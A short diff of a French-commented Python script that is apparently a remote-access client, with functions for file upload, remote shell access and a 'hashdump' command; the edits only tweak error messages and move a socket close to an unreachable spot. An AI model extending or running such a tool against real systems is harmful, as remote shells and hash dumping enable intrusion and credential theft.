@@ -54,10 +54,9 @@ def upload(ssl_socket):
                 if not chunk:
                     break
                 file.write(chunk)
-            print(f"Le fichier '{filename} a bien été reçu")
     except Exception as e:
-        print(f"Erreur lors de la réception du fichier")
-        #ssl_socket.recv(filename.decode())
+        return(f"Erreur lors de la réception du fichier")
+        
 
 # Fonction permettant d'accepter un shell depuis le serveur
 def shell(ssl_socket):
@@ -161,8 +160,8 @@ def main():
             hashdump(ssl_socket)
         elif command.lower() == 'exit':
             break
-
-    ssl_socket.close()  # Fermeture du socket
+            ssl_socket.close()
+    #ssl_socket.close()  # Fermeture du socket
 
 if __name__ == "__main__":
     main()
